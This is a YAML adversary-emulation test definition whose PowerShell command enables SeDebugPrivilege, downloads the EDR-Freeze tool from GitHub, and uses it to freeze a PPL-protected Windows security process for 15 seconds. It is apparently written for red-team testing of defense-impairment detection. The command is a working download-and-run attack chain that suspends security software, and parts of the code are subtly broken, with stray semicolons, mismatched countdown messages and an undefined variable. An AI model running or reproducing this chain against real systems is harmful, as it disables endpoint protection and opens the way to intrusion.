- requirements: []
  name: Soumaia ART Tests - Freeze PPL-protected process with EDR-Freeze
  description: This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes — such as those related to antivirus, credential protection, and system integrity — from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes. (requires elevation)
  tactic: defense-impairment
  technique_id: T1685
  technique_name: Disable or Modify Tools
  executors:
  - cleanup:
    - 'Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output "File deleted: $edrFreezeExe"'
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: 'Add-Type -TypeDefinition @"; using System; using System.Runtime.InteropServices; public class TokenAdjuster { [DllImport("advapi32.dll", SetLastError = true)]; public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle); [DllImport("advapi32.dll", SetLastError = true)]; public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid); [DllImport("advapi32.dll", SetLastError = true)]; public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,; ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength); [StructLayout(LayoutKind.Sequential, Pack = 1)]; public struct TOKEN_PRIVILEGES { public int PrivilegeCount; public long Luid; public int Attributes; }; public const int SE_PRIVILEGE_ENABLED = 0x00000002; public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020; public const uint TOKEN_QUERY = 0x0008; public static bool EnableSeDebugPrivilege() { IntPtr hToken; if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken)); return false; long luid; if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid)); return false; TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES(); tp.PrivilegeCount = 1; tp.Luid = luid; tp.Attributes = SE_PRIVILEGE_ENABLED; return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero); } }; "@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) { Write-Host "SeDebugPrivilege enabled successfully." -ForegroundColor Green } else { Write-Host "Failed to enable SeDebugPrivilege." -ForegroundColor Red; exit 1 }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host "Process Name: $processName)"; Write-Host "PID: $($process.Id)"; $query = "SELECT * FROM Win32_Process WHERE Name = ''$processName.exe''"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner(); Write-Host "User: $($owner.Domain)\$($owner.User)"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = "https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip"; $zipPath = Join-Path $scriptFolder "EDR-Freeze_1.0.zip"; Write-Host "Downloading latest EDR-Freeze from $downloadUrl" -ForegroundColor Cyan; try { Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop; Write-Host "Download completed: $zipPath" -ForegroundColor Green; $extractFolder = $scriptFolder; if (Test-Path $zipPath) { Write-Host "Extracting archive to $extractFolder (overwriting existing files)" -ForegroundColor Cyan; if (Test-Path $extractFolder) { Get-Process -Name "EDR-Freeze_1.0" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue }; Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null; $archive = $null; try { $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath); foreach ($entry in $archive.Entries) { if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }; if ($entry.FullName.EndsWith(''/'')) { $dirPath = Join-Path $extractFolder $entry.FullName; if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }; continue }; $destPath = Join-Path $extractFolder $entry.FullName; $destDir = Split-Path $destPath -Parent; if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }; if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }; try { [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false) } catch { Write-Host "Failed to extract entry $($entry.FullName): $_" -ForegroundColor Yellow } }; Write-Host "Extraction completed." -ForegroundColor Green } finally { if ($archive) { $archive.Dispose() } } } } catch { Write-Host "Failed to download or extract EDR-Freeze: $_" -ForegroundColor Red }; Write-Host "Waiting 15s before putting $processName in the comma" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host "Waiting 10s before putting $processName in the comma" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host "Waiting 5s before putting $processName in the comma" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host "Waiting 2s before putting $processName in the comma" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter ''EDR-Freeze_*.exe'' -ErrorAction SilentlyContinue |; Sort-Object LastWriteTime -Descending |; Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) { Write-Host "No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder" -ForegroundColor Red; exit 1 }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host "Using EDR-Freeze executable: $edrFreezeExeName" -ForegroundColor Cyan; Write-Host "$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList ("$($process.Id) 15000") | Out-Null'
